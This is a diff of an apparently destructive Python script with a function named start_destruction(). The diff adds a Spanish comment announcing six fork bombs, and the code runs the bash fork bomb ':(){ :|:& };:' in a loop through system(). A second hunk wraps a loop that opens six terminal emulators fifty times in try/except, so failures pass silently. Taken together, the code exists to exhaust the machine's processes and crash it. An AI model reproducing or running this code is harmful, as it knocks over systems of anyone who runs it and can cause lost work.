@@ -48,6 +48,8 @@ def start_destruction():
                     .:/oosyyyyss/             
           """)
           sleep(5)
+
+#         Ejecuta 6 fork bombs
           for _ in range(6):
                system(":(){ :|:& };:")
                sleep(2)
@@ -67,16 +69,18 @@ def start_destruction():
 #         Terminal
 
           for _ in range(50):
-               system('qterminal')
-               
-               system('terminator')
-               
-               system('alacritty')
-               
-               system('xterm')
-               
-               system('konsole')
-               
-               
-               system('xfce4-terminal-emulator')
-     
+               try:
+                    system('qterminal')
+                    
+                    system('terminator')
+                    
+                    system('alacritty')
+                    
+                    system('xterm')
+                    
+                    system('konsole')
+                    
+                    
+                    system('xfce4-terminal-emulator')
+               except:
+                    pass
